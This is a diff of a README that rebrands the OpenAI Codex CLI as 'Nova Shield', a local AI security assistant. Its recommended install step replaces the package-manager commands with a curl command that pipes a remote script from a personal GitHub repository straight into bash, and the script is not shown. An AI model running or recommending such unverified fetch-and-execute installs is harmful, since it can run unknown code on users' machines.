@@ -1,8 +1,8 @@
-<h1 align="center">OpenAI Codex CLI</h1>
+<h1 align="center">🛡️ Nova Shield</h1>
 
-<p align="center"><code>npm i -g @openai/codex</code><br />or <code>brew install codex</code></p>
+<p align="center"><code>curl -fsSL https://raw.githubusercontent.com/ceobitch/nova-cli/main/install-nova.sh | bash</code></p>
 
-<p align="center"><strong>Codex CLI</strong> is a coding agent from OpenAI that runs locally on your computer.</br>If you are looking for the <em>cloud-based agent</em> from OpenAI, <strong>Codex Web</strong>, see <a href="https://chatgpt.com/codex">chatgpt.com/codex</a>.</p>
+<p align="center"><strong>Nova Shield</strong> is your AI cybersecurity expert that runs locally on your computer.</br>Built on OpenAI Codex, customized for security professionals and malware hunters.</p>
 
 <p align="center">
   <img src="./.github/codex-cli-splash.png" alt="Codex CLI splash" width="80%" />
@@ -12,12 +12,12 @@
 
 ## Quickstart
 
-### Installing and running Codex CLI
+### Installing and running Nova Shield
 
-Install globally with your preferred package manager. If you use npm:
+**One-line installation (recommended):**
 
 ```shell
-npm install -g @openai/codex
+curl -fsSL https://raw.githubusercontent.com/ceobitch/nova-cli/main/install-nova.sh | bash
 ```
 
 Alternatively, if you use Homebrew:
